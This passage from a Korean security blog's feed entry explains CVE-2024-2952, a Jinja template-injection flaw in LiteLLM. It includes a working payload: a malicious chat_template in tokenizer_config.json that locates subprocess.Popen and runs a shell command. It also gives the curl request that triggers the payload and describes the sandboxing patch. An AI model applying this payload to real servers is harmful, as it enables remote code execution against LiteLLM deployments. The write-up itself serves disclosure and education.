Jinja &#xD15C;&#xD50C;&#xB9BF;&#xB97C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB54C;, <code>chat_template</code> &#xAC12;&#xC744; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xADF8;&#xB300;&#xB85C; &#xC0AC;&#xC6A9;&#xD574; SSTI &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC784;&#xC758;&#xC758; Hugging Face &#xBAA8;&#xB378;&#xC5D0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; <code>tokenizer_config.json</code> &#xD30C;&#xC77C;&#xC744; &#xD3EC;&#xD568;&#xC2DC;&#xCF1C; &#xC784;&#xC758;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs twig"><span class="xml">{</span><span class="xml">  &quot;bos_token&quot;:&quot;&quot;,</span><span class="xml">  &quot;eos_token&quot;:&quot;&quot;,</span><span class="xml">  &quot;chat_template&quot;:&quot;</span><span class="hljs-template-tag">{% <span class="hljs-name"><span class="hljs-keyword">set</span></span> ci = namespace(i=0) %}</span><span class="hljs-template-tag">{% <span class="hljs-name"><span class="hljs-keyword">for</span></span> c in ().__class__.__base__.__subclasses__()%}</span><span class="hljs-template-tag">{% <span class="hljs-name"><span class="hljs-keyword">set</span></span> ci.i =ci.i+ 1 %}</span><span class="hljs-template-tag">{% <span class="hljs-name"><span class="hljs-keyword">if</span></span> c.__name__==&apos;Popen&apos; %}</span><span class="hljs-template-variable">{{ci.i}}</span><span class="hljs-template-tag">{% <span class="hljs-name"><span class="hljs-keyword">endif</span></span> %}</span><span class="hljs-template-tag">{% <span class="hljs-name"><span class="hljs-keyword">endfor</span></span> %}</span><span class="xml">&quot;</span><span class="xml">}</span></code></pre><p>Hugging Face&#xC5D0; &#xBAA8;&#xB378;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0;, &#xC704; <code>tokenizer_config.json</code> &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xD15C;&#xD50C;&#xB9BF;&#xC740; <code>subprocess.Popen</code> &#xD074;&#xB798;&#xC2A4;&#xC758; &#xC778;&#xB371;&#xC2A4;&#xB97C; &#xCC3E;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;, <code>bos_token</code>&#xACFC; <code>eos_token</code> &#xAC12;&#xC740; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xD750;&#xB984;&#xC744; &#xBC29;&#xD574;&#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs rust">curl -X <span class="hljs-symbol">&apos;POST</span>&apos; \  <span class="hljs-symbol">&apos;http</span>:<span class="hljs-comment">//localhost:8000/completions&apos; \</span>  -H <span class="hljs-symbol">&apos;accept</span>: application/json&apos; \  -d &apos;{<span class="hljs-string">&quot;model&quot;</span>:<span class="hljs-string">&quot;huggingface/&lt;user_name&gt;/&lt;model_name&gt;&quot;</span>,<span class="hljs-string">&quot;prompt&quot;</span>:<span class="hljs-string">&quot;hi&quot;</span>}&apos;</code></pre><p><code>/completions</code> &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB85C; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xBA74; <code>hf_chat_template</code> &#xBA54;&#xC11C;&#xB4DC;&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xC5B4; <code>Popen</code> &#xD074;&#xB798;&#xC2A4;&#xC758; &#xC778;&#xB371;&#xC2A4; &#xBC88;&#xD638;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs markdown">{  &quot;bos<span class="hljs-emphasis">_token&quot;:&quot;&quot;,</span><span class="hljs-emphasis">  &quot;eos_</span>token&quot;:&quot;&quot;,  &quot;chat<span class="hljs-emphasis">_template&quot;:&quot;{{().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">389</span>](<span class="hljs-link">[&apos;touch&apos;,&apos;/tmp/1337&apos;]</span>)}}&quot;</span><span class="hljs-emphasis">}</span></code></pre><p>&#xC778;&#xB371;&#xC2A4; &#xBC88;&#xD638;&#xB97C; &#xD655;&#xC778;&#xD55C; &#xD6C4;, <code>tokenizer_config.json</code> &#xD30C;&#xC77C;&#xC744; &#xC704;&#xC640; &#xAC19;&#xC774; &#xC218;&#xC815;&#xD574; &#xC784;&#xC758;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>Popen</code> &#xD074;&#xB798;&#xC2A4;&#xC758; &#xC778;&#xB371;&#xC2A4; &#xBC88;&#xD638;&#xB294; &#xC11C;&#xBC84; &#xD658;&#xACBD;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB97C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xAC01; &#xC11C;&#xBC84; &#xD658;&#xACBD;&#xC5D0; &#xB9DE;&#xAC8C; &#xC778;&#xB371;&#xC2A4; &#xBC88;&#xD638;&#xB97C; &#xD655;&#xC778;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/07/ogu123/cve-2024-2952/image1.png" alt></p><p>touch &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xC5B4; <code>/tmp/1337</code> &#xD30C;&#xC77C;&#xC774; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C;, &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC784;&#xC758;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/07/ogu123/cve-2024-2952/image2.png" alt></p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Jinja &#xD15C;&#xD50C;&#xB9BF;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xD658;&#xACBD;&#xC744; <code>Environment</code>&#xC5D0;&#xC11C; <code>ImmutableSandboxedEnvironment</code>&#xB85C; &#xBCC0;&#xACBD;&#xD574; &#xD0EC;&#xD50C;&#xB9BF; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC2E4;&#xD589; &#xAC00;&#xB2A5;&#xD55C; &#xCF54;&#xB4DC; &#xBC94;&#xC704;&#xB97C; &#xC81C;&#xD55C;&#xD558;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/advisories/GHSA-46cm-pfwv-cgf8">https://github.com/advisories/GHSA-46cm-pfwv-cgf8</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/SSTI/">SSTI</category>
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/LiteLLM/">LiteLLM</category>
      
      
      <comments>https://hackyboiz.github.io/2024/08/07/ogu123/cve-2024-2952/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
